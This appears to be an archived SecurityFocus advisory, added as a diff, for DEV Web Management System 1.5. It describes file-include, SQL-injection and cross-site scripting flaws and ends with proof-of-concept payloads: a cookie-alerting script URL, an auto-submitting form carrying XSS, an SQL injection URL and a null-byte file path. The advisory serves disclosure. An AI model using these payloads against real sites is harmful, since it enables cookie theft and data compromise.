@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/30447/info
+
+DEV Web Management System is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data. The issues include local file-include, SQL-injection, and cross-site scripting vulnerabilities.
+
+Exploiting these issues could allow an attacker to view sensitive information, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+DEV Web Management System 1.5 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/?session=">><>><script>alert(document.cookie)</script> <html> <head></head> <body onLoad=javascript:document.form.submit()> <form action="http://www.example.com/index.php?session=0&action=search" method="POST" name="form"> <form method="post" onSubmit="return validateprm(this)"><input type="hidden" name="prip" value="true"/><input type="hidden" name="action" value="search"/> <input type="hidden" name="kluc" value="&#34&#39&#39&#39&#60&#62&#62&#62&#62<script>alert('xss')</script>"> </form> </body> </html> http://www.example.com/index.php?session=0&action=read&click=open&article=[SQL CODE] http://www.example.com/admin/index.php?start=install&step=file.type%00 
